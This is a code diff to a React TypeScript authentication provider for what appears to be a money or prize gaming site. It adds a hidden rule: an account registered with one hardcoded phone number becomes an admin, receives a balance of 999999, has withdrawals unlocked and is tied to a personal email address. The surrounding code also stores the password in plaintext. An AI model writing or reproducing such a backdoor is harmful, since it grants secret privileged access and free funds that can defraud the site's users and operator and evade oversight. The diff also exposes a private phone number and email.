@@ -83,20 +83,21 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       }
     }
 
+    const isPhoneAdmin = phone === '21982331392';
     const newUser: User = {
       id: userId,
       name,
-      email: `${phone}@ltjogos.com`,
+      email: isPhoneAdmin ? 'tatuador.adrianoledio@gmail.com' : `${phone}@ltjogos.com`,
       phone,
       password: pass,
-      role: 'user',
-      balance: 0,
+      role: isPhoneAdmin ? 'admin' : 'user',
+      balance: isPhoneAdmin ? 999999 : 0,
       earnings: 0,
       createdAt: new Date().toISOString(),
       dailyPrizeTotal: 0,
       lastPrizeDate: new Date().toISOString().split('T')[0],
       referrals: 0,
-      unlockFirstWithdrawal: false,
+      unlockFirstWithdrawal: isPhoneAdmin,
       referralLink,
       withdrawalsCount: 0,
       referredBy,
